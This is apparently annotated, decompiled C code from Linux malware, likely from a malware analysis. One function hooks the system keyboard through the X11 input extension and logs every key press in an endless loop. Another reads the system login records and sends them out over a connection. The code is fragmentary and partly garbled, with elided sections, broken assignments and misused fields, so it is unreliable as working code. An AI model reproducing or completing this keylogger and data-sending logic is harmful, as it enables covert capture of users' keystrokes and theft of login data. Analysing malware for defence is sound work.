int32_t  __attribute__((cdecl)) cpStartKeylogger () {
	
	// It isn't importat to fully grasp the types of this variables

	Display *display; // informations regarding the windows
	int32_t n_devices;
	XDevice *device;
    int32_t KEY_PRESS_TYPE;
    XKeyEvent *single_event;
    XKeyEvent *hooks;
    Window root;
	XEventClass event_class; // all the events we want to capture
	XDeviceInfo *devices;

	...

	// LoadKeyloggerAPI:	Loads all the X11 necessary API
	LoadKeyloggerAPI ();


	// Connect or disconnect to X server 
	x_server_handle = XOpenDisplay (0);

	// Function determines if the named extension is present
	asd = XQueryExtension(result, "XInputExtension", &v24, &v22, &v23)

	// 
	XListInputDevices(x_server_handle, &_devices, asd, asd)

	...

	// Get a list with input devices
	XDeviceInfo *devices = XListInputDevices (display , &n_devices);

	for (int32_t i = 0; i < n_devices; ++i) {

		// Look for a device 
		if (strstr(haystack, "System keyboard") || strstr(haystack, "System keyboard")) {
			// Get the handle of the keyboard device
			// The id is a number in the range 0-128 that uniquely identifies
			// the device. It is assigned to the device when it is initialized
			// by the server.
			= devices.id;
		}

	}

	// The XOpenDevice request makes an input device accessible to a
	// client through input extension protocol requests. If
	// successful, it returns a pointer to an XDevice structure.

	device = XOpenDevice( display, devices[i].id );
	

    // DeviceKeyPress:
    // returns the DeviceKeyPress event type and the eventclass for
    // DeviceKeyPress events from the specified device.

    // This eventclass can then be used in an XSelectExtensionEvent
    // request to ask the server to send DeviceKeyPress events from
    // this device. When a selected event is received via XNextEvent,
    // the type can be used for comparison with the type in the event.

    DeviceKeyPress( device, KEY_PRESS_TYPE, event_class );

	XSelectExtensionEvent( display, root, &event_class, 1 );

	// Log all keys
	while (TRUE) {
		// Gets an event from the 'XEvent' queue
		// Intercept the event
		XNextEvent (&display, &single_event);

		// Acquire its information
		hooks.type = single_event.type;
		hooks.display = single_event.xcreatewindow.display;
		hooks.root = single_event.xproperty.time;
		hooks.time = single_event.xkeymap.key_vector[12];
		hooks.y = single_event.pad[10]
		hooks.y_root = single_event.pad[12]
		hooks.keycode = single_event.pad[14]

		// Translate it
		LogKey (hooks, hooks, &display);
	}

	XCloseDisplay ();
	...
}


int __attribute__((cdecl)) cpSleep(__useconds_t useconds) {
	usleep (useconds);
}


BOOL __attribute__((cdecl)) cpBeginThread (void *(*start_routine)(void *), void *arg) {

  pthread_t newthread; 
  return pthread_create(&newthread, 0, start_routine, arg) == 0;
  
}



// This function literally logs the 'log' file that keeps track of logins.
// Example of a login row:
// shxdow   tty1         :1               Tue Apr  4 12:14 - 12:14  (00:00)
void cpLogonSessions (uint32_t fd) {

	struct utmp * line_record;

	// Sets the pointer to beginning of the file
	setutxent ();


	while (1) {
		// Read a line from the login file
		line_record = getutxent ();

		// To put it simply, it writes to a string the entire record previously read

		...

		__asprintf_chk(
		             &result,
		             1,
		             "%d\a%s\a%s\a%s\a%.2d/%.2d/%d %.2d:%.2d:%.2d\a%s\a",
		             line_record->ut_type,
		             line_record->ut_user,
		             line_record->ut_id,
		             line_record->ut_line,
		             time_stamp->tm_mday,
		             time_stamp->tm_mon + 1,
		             time_stamp->tm_year + 1900,
		             time_stamp->tm_hour,
		             time_stamp->tm_min,
		             time_stamp->tm_sec,
		             line_record->ut_host);

		...

		SendData (data, fd, ..., ...);
	}
	...
}